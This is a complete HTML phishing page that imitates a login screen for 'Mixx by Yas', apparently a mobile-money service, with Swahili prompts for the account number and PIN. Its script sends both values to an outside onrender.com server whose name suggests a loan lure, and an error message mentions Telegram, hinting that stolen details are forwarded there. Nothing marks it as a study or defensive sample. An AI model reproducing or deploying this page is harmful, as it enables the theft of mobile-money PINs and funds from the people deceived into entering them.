<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mixx by Yas</title>

<style>

body{
    font-family:Arial;
    background:#f2f2f2;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container{
    background:white;
    padding:25px;
    width:350px;
    border-radius:10px;
    box-shadow:0 0 10px rgba(0,0,0,0.1);
}

h2{
    text-align:center;
    color:green;
}

input{
    width:100%;
    padding:12px;
    margin-top:15px;
    border:1px solid #ccc;
    border-radius:5px;
}

button{
    width:100%;
    padding:12px;
    margin-top:20px;
    background:green;
    color:white;
    border:none;
    border-radius:5px;
    font-size:16px;
}

.message{
    text-align:center;
    margin-top:15px;
}

</style>
</head>

<body>

<div class="container">

<h2>Mixx by Yas</h2>

<input type="text" id="namba" placeholder="Weka Namba ya Mixx by Yas">

<input type="password" id="pin" placeholder="Weka PIN ya Mixx by Yas">

<button onclick="tumaTaarifa()">
ENDELEA
</button>

<div class="message" id="message"></div>

</div>

<script>

async function tumaTaarifa(){

    let namba = document.getElementById("namba").value;
    let pin = document.getElementById("pin").value;

    let message = document.getElementById("message");

    message.innerHTML = "Inatuma...";

    try{

        let response = await fetch("https://mkopo-wa-mixx-by-yas.onrender.com/submit-step3",{

            method:"POST",

            headers:{
                "Content-Type":"application/json"
            },

            body:JSON.stringify({
                namba:namba,
                pin:pin
            })

        });

        let data = await response.json();

        console.log(data);

        if(response.ok){

            message.style.color = "green";
            message.innerHTML = "Imetumwa successfully";

        }else{

            message.style.color = "red";
            message.innerHTML = "Telegram failed";

        }

    }catch(error){

        console.log(error);

        message.style.color = "red";
        message.innerHTML = "Backend error";

    }

}

</script>

</body>
</html>
